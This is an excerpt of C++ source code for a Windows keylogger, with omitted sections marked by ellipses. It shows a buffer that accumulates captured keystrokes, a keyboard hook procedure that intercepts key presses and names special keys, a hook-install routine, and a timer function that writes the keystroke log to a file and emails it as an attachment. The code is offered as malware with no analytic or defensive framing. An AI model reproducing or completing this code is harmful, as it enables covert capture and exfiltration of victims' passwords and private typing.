...
string keylog = ""; // where store all key strokes are stored

void TimerSendMail(){
	if (keylog.empty()) // do nothing if keylog is empty
		return;

	string last_file = DirectoryCreate::WriteLog(keylog);

	if (last_file.empty()) // if empty, write to debugging log (not successful)
	{
		CustTime::WriteAppLog("Key Trace creation Failed. KeyTrace '" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]", 
		"The encrypted file has been attached to this mail : To check if the app is working correctly try to decrypt the text file and check if it matches the text thekey you typed\n\n",
		DirectoryCreate::GetOurPath(true) + last_file);

	if (x != 7) // if mail was not sent
		CustTime::WriteAppLog("Mail was not sent! Error code: " + CustTime::ToString(x));
	else
...
LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam) // intercept key presses
{
	...
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) // if key state is released, used for sys keys like SHIFT
	{
		...
		if (key == VK_CONTROL || key == VK_LCONTROL ||
			...
			key == VK_RWIN)
		{
			string KeyName = Keys::KEYS[kbs->vkCode].Name; // translate key to human friendly name
...
bool InstallHook()
{
	CustTime::WriteAppLog("Hook started... Timer started"); // Debug message
